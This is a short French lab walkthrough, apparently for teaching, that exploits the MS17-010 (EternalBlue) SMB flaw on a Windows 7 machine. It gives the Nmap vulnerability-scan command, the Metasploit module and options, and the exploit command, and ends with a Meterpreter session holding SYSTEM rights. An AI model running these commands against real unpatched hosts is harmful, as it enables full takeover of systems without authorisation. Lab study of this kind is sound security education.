Étapes de l'attaque Prêt à lancer
1. Reconnaissance NMAP
On vérifie si le port 445 (SMB) est ouvert et si la faille MS17-010 est présente grâce au script NSE de Nmap.
nmap --script smb-vuln-ms17-010 192.168.56.101
2. Initialisation METASPLOIT
Lancement du framework Metasploit et sélection du module d'attaque spécifique "EternalBlue" développé par la NSA.
use exploit/windows/smb/ms17_010_eternalblue
3. Configuration OPTIONS
Définition des cibles :
• RHOSTS (Remote) : L'IP de la victime (Win7).
• LHOST (Local) : Notre IP (Kali) pour recevoir la connexion retour.
set RHOSTS 192.168.56.101
4. Exploitation EXPLOIT
Envoi de paquets SMB malformés pour corrompre la mémoire du noyau Windows (Buffer Overflow) et exécuter notre code.
exploit
5. Post-Exploitation SYSTEM
Succès ! Une session Meterpreter est ouverte. Nous avons les droits "SYSTEM" (supérieurs à Administrateur).
getuid -> NT AUTHORITY\SYSTEM
